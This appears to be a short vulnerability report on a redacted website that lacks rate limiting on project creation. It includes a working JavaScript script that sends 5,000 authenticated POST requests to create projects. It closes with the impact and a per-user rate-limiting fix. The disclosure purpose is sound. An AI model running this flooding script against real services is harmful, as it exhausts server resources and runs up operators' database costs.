# Project DoS

## Exploitation

With all the other DoSes, creating many projects in this website could definitely cause resource exhaustion.

Code used provided below. (Code made by AI)

```javascript
(async function userNuke(y) {
    const url = "https://[REDACTED].com/projects";
    const bearer = ""; //token here

    console.log(`Starting project bloat: ${y} projects...`);

    for (let i = 1; i <= y; i++) {
        const projName = `User_${i}`;
        
        fetch(url, {
            method: "POST",
            headers: {
                "Authorization": "Bearer " + bearer,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: projName,
                project_type: "normal"
            })
        }).then(r => {
            if (r.status === 201 || r.status === 200) {
                console.log(`Successfully created: ${projName}`);
            } else {
                console.log(`Failed ${projName}: Status ${r.status}`);
            }
        }).catch(err => console.error(`Error creating ${projName}:`, err));

        // Delay every 50 requests to avoid browser lock-up
        if (i % 50 === 0) {
            await new Promise(r => setTimeout(r, 150));
        }
    }
    console.log("All project creation requests dispatched.");
})(5000);
```
## Why this is bad

You create many files in the database, which not only hogs up server CPU and RAM, but also can cause your database to hit your tier limit, requiring you to pay more.

## The fix

Implement per-user rate-limiting on endpoints where users can send non-GET requests.
